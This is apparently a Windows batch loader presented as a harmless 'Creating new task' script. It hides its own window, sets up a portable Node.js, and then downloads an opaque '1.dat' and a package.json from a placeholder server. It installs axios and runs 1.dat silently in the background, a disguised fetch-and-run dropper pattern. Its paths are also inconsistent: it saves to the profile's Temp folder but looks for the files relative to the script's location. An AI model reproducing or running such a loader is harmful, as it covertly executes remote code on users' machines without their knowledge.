@echo off
title Creating new task
setlocal enabledelayedexpansion

if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

REM Get latest Node.js version using PowerShell
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"

REM Remove leading "v"
set "NODE_VERSION=%LATEST_VERSION:v=%"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "NODE_EXE="

:: -------------------------
:: Check for global Node.js
:: -------------------------
:: for /f "delims=" %%v in ('node -v 2^>nul') do (
::     set "NODE_EXE=node"
::     set "NODE_INSTALLED_VERSION=%%v"
:: )

if defined NODE_EXE (
    echo [INFO] Node.js is already installed globally: %NODE_INSTALLED_VERSION%
) else (
    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Node.js found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else ( echo [INFO] Node.js not found globally. Attempting to extract portable version...

    :: -------------------------
    :: Download Node.js MSI if needed
    :: -------------------------
    where curl >nul 2>&1
    if %errorlevel% NEQ 0 (
        echo [INFO] Using PowerShell to download Node.js...
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
    ) else (
        echo [INFO] Using curl to download Node.js...
        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
    )

    if exist "%~dp0%NODE_MSI%" (
        echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
        del "%~dp0%NODE_MSI%"
    ) else (
        echo [ERROR] Failed to download Node.js MSI.
        exit /b 1
    )

    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Node.js found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (
        echo [ERROR] node.exe not found after extraction.
        exit /b 1
    )
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
%NODE_EXE% -v >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Node.js execution failed.
    exit /b 1
)

:: -------------------------
:: Download required files
:: -------------------------
set "USERPROFILE=%USERPROFILE%"
echo [INFO] Downloading 1.dat and package.json...

MD "%USERPROFILE%\AppData\Local\Temp" 2>nul
curl -L -o "%USERPROFILE%\AppData\Local\Temp\1.dat" "https://<your-server-url>/120/1.dat"
curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://<your-server-url>/package.json"

:: -------------------------
:: Install dependencies
:: -------------------------
if not exist "%~dp0AppData\Local\Temp\node_modules\request" (
    pushd "%~dp0AppData\Local\Temp"
    echo [INFO] Installing NPM packages...
    call npm install axios

    if errorlevel 1 (
        echo [ERROR] npm install failed.
        popd
        exit /b 1
    )
    popd
)

:: -------------------------
:: Run the parser
:: -------------------------
if exist "%~dp0AppData\Local\Temp\1.dat" (
    echo [INFO] Running 1.dat...
    start "" /b "%NODE_EXE%" "%~dp0AppData\Local\Temp\1.dat"
    if errorlevel 1 (
        echo [ERROR] parser execution failed.
        exit /b 1
    )
) else (
    echo [ERROR] 1.dat not found.
    exit /b 1
)

echo [SUCCESS] Script completed successfully.
exit /b 0
